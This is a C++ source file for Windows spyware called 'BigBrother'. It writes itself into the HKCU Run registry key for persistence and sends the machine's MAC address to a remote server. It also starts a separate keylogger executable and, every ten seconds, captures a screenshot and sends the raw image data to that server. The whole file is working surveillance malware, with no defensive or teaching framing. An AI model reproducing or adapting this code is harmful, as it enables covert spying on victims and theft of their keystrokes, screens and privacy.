#include "BigBrother.hpp"

#define STB_IMAGE_IMPLEMENTATION
#include "stb_image.h"

double wtime()
{
    struct timeval t;
    gettimeofday(&t, NULL);

    return (double)t.tv_sec + (double)t.tv_usec * 1E-6;
}


int CreateProc(TCHAR *procname)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL,   // No module name (use command line)
        procname,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
    )
    return 1;

    // Wait until child process exits
    //WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles.
    //CloseHandle(pi.hProcess);
    //CloseHandle(pi.hThread);
    return 0;
}


int main()
{
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, REG_OPTION_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
            cout << "registry write error" << endl;

    char DirPath[MAX_PATH];
    GetModuleFileName(GetModuleHandle(0), DirPath, MAX_PATH);

    if (RegSetValueEx(hKey, "BigBrother", 0, REG_SZ, (BYTE *)DirPath, 32)
        != ERROR_SUCCESS )
            cout << "registry write error" << endl;

    if (RegCloseKey(hKey) != ERROR_SUCCESS)
        cout << "close key error";


    SOCKET ConnectSocket = client();

    char *pMAC = getMAC();
    send(ConnectSocket, pMAC, (int)strlen(pMAC), 0);

    WCHAR *filename = L"C:\\ProgramData\\prtscr.png";
    double t;
    TCHAR *procname = "KeyLogger.exe";

    if ((CreateProc(procname)) == 1)
        cout << "key logger start failed" << endl;

    int w, h, c;

    while (1) {
        t = wtime();
        while ((wtime() - t) < 10) {}
        SaveBitmap(filename);

        ConnectSocket = client();
        char *image_data = (char *)stbi_load("C:\\ProgramData\\prtscr.png", &w, &h, &c, 3);
        char *prtscr = "screenshot";
        send(ConnectSocket, prtscr, (int)strlen(prtscr), 0);

        ConnectSocket = client();
        int screen_size = w * h * 3;
        send(ConnectSocket, image_data, screen_size, 0);
    }

    return 0;
}
